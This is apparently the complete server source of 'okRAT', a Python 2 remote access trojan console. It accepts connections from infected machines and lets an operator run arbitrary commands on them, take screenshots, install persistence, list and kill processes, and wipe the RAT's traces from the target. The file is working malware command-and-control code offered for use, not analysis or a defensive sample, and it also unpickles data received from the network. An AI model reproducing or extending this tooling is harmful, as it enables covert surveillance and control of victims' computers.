#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# okRAT server
#

import argparse
import socket
import sys
import threading
from time import sleep
import os
import pickle


BANNER = '''
        __     __________         __   
  ____ |  | __ \______   \_____ _/  |_ 
 /  _ \|  |/ /  |       _/\__  \\\\   __\\
(  <_> )    <   |    |   \ / __ \|  |  
 \____/|__|_ \  |____|_  /(____  /__|  
            \/         \/      \/      
'''

CLIENT_COMMANDS = ['execute', 'persistence', 'shutdown', 'restart', 'listprocesses', 'killprocess', 'pwd',
                   'selfdestruct']
HELP_TEXT = '''Command             | Description
---------------------------------------------------------------------------
clients             | List connected clients.
client <id>         | Connect to a client.
screenshot          | Take a screenshot of client computer.
execute <command>   | Execute a command on the target.
goodbye             | Exit the server and selfdestruct all clients.
help                | Show this help menu.
kill                | Kill the client connection.
shutdown            | Shutdown client.
restart             | Restart client.
persistence         | Apply persistence mechanism.
pwd                 | Get the present working directory.
quit                | Exit the server and keep all clients alive.
listprocesses       | List processes running on client computer.
killprocess         | Kill process running on client computer.
selfdestruct        | Remove all traces of the RAT from the target system.'''


class Server(threading.Thread):
    clients = {}
    client_count = 1
    current_client = None

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            client_id = self.client_count
            client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def send_client(self, message, client):
        if not message:
            message = 'Ok (no output)'

        try:
            length = len(message)
            client.conn.send(bytes(length))
            sleep(1)
            client.conn.send(bytes(message))
        except Exception as e:
            print 'Error: {}'.format(e)

    def recv_client(self, client, printer=True):
        try:
            length = client.conn.recv(1024)
            expected_length = int(length)
            received_data = ''
            while len(received_data) < expected_length:
                received_data += client.conn.recv(4096)
            if(printer):
                print received_data
            return received_data
        except Exception as e:
            print 'Error: {}'.format(e)

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print 'Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print 'Error: Invalid Client ID.'

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def screenshot(self, _):
        print 'ip: {}'.format(self.current_client.addr[0])
        ip = self.current_client.addr[0]
        self.send_client('screenshot', self.current_client)
        received_file_data = self.recv_client(
            self.current_client, False)
        frame_data = pickle.loads(received_file_data)
        if received_file_data != 'reachedexcept':
            counter = 0
            while True:
                local_filename = 'screenshot-{}-{}.png'.format(
                    ip, str(counter))
                if not os.path.isfile(local_filename):
                    break
                counter += 1
            try:
                downloaded_file_descriptor = open(local_filename, 'wb')
                downloaded_file_descriptor.write(frame_data)
                downloaded_file_descriptor.close()
                print ('Screenshot saved as ' + local_filename + '\n')
            except Exception as e:
                print 'Error: {}'.format(e)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print 'ID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])

    def quit_server(self, _):
        if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def goodbye_server(self, _):
        if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('selfdestruct', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print HELP_TEXT


class ClientConnection():
    def __init__(self, conn, addr, uid=0):
        self.conn = conn
        self.addr = addr
        self.uid = uid


def get_parser():
    parser = argparse.ArgumentParser(description='okRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    port = args['port']
    client = None

    print BANNER

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'okRAT server listening for connections on port {}.'.format(port)

    # server side commands
    server_commands = {
        'client':       server.select_client,
        'clients':      server.list_clients,
        'goodbye':      server.goodbye_server,
        'help':         server.print_help,
        'kill':         server.kill_client,
        'quit':         server.quit_server,
        'selfdestruct': server.selfdestruct_client,
        'screenshot':   server.screenshot
    }

    while True:
        if server.current_client:
            ccid = server.current_client.uid
        else:
            ccid = '?'

        prompt = raw_input('\n[{}] okRAT> '.format(ccid)).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        if cmd in server_commands:
            server_commands[cmd](action)

        elif cmd in CLIENT_COMMANDS:
            if ccid == '?':
                print 'Error: No client selected.'
                continue

            print 'Running {}...'.format(cmd)
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)

        else:
            print 'Invalid command, type "help" to see a list of commands.'


if __name__ == '__main__':
    main()
